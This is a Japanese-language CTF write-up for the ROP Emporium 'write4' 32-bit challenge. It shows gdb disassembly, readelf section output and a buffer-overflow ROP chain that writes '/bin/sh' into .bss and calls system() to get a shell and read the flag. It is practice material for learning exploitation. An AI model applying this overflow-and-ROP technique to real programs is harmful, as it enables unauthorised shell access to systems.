```
~/yyy-d/work/ctf/pwn/ROP-Emporium/write432:yyy@[master](*｡˃̵ω ˂̵｡) < ./write432
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> hoge

Exiting
```

```
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x0804864c  usefulFunction
0x08048670  usefulGadgets
0x08048680  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
```

```
gdb-peda$ disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804864c <+0>:	push   ebp
   0x0804864d <+1>:	mov    ebp,esp
   0x0804864f <+3>:	sub    esp,0x8
   0x08048652 <+6>:	sub    esp,0xc
   0x08048655 <+9>:	push   0x8048754
   0x0804865a <+14>:	call   0x8048430 <system@plt>
   0x0804865f <+19>:	add    esp,0x10
   0x08048662 <+22>:	nop
   0x08048663 <+23>:	leave
   0x08048664 <+24>:	ret
End of assembler dump.
```

とりあえず `usefulFunction` に遷移させてみる

```shell
$ python -c 'print "A" * 44 + "\x4c\x86\x04\x08"' |./write432
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> exploit.py  flag.txt  input.txt  peda-session-write432.txt  result-readelf  ropgadget  write432  write432.dis  writeup.md

zsh: done                                        python -c 'print "A" * 44 + "\x4c\x86\x04\x08"' |
zsh: illegal hardware instruction (core dumped)  ./write432
```

lsしているだけなので、 `/bin/sh` を渡してシェルを起動させたい

```
gdb-peda$ disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048672 <+2>:	ret
   0x08048673 <+3>:	xchg   ax,ax
   0x08048675 <+5>:	xchg   ax,ax
   0x08048677 <+7>:	xchg   ax,ax
   0x08048679 <+9>:	xchg   ax,ax
   0x0804867b <+11>:	xchg   ax,ax
   0x0804867d <+13>:	xchg   ax,ax
   0x0804867f <+15>:	nop
End of assembler dump.
```

`usefulGadgets` にある `mov  DWORD PTR [edi], ebp` を使えばできそう

ediにbufferとして使う領域のアドレス、ebpに渡したい文字列を格納する

bufferとして使うアドレスとしては、書き込み可能な領域がいい

```shell
$ readelf -S write432
31 個のセクションヘッダ、始点オフセット 0x196c:

セクションヘッダ:
  [番] 名前              タイプ          アドレス Off    サイズ ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000d0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ac 0002ac 000081 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804832e 00032e 00001a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048348 000348 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048368 000368 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048388 000388 000038 08  AI  5  24  4
  [11] .init             PROGBITS        080483c0 0003c0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483f0 0003f0 000080 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048470 000470 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048480 000480 000262 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048798 000798 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001030 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001861 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001064 000510 10     30  50  4
  [30] .strtab           STRTAB          00000000 001574 0002ed 00      0   0  1
フラグのキー:
  W (write), A (alloc), X (実行), M (merge), S (文字列)
  I (情報), L (リンク順), G (グループ), T (TLS), E (排他), x (不明)
  O (追加の OS 処理が必要) o (OS 固有), p (プロセッサ固有)
```
26番目にあるbssセクションをbufferとして扱う

あとは、 `pop edi; pop ebp; ret` のようなGadgetを探す

pedaにて `ropgadget` でもいいし、 `$ ROPGadget --binary write432 > ropgadget` でもいい

以上より、 `/bin/sh` を格納したアドレスをsystemの引数として渡せばおわり

以下が完成したROP Chain
```
payload = ''
payload += 'A' * 44
payload += p32(pop2ret)
payload += p32(bss_addr)  # edi
payload += "/bin"  # ebp
payload += p32(mov_edi_ebp)
payload += p32(pop2ret)
payload += p32(bss_addr + 4)
payload += "/sh\x00"
payload += p32(mov_edi_ebp)
payload += p32(system)
payload += "A" * 4  # padding
payload += p32(bss_addr)
```

結果

```
~/yyy-d/work/ctf/pwn/ROP-Emporium/write432:yyy@+[master](๑˃̵ᴗ˂̵)ﻭ < python exploit.py
[+] Starting local process './write432': pid 27110
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
>
[*] Switching to interactive mode
$
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
$ exit
$
[*] Got EOF while reading in interactive
$
[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 27110)
[*] Got EOF while sending in interactive
```
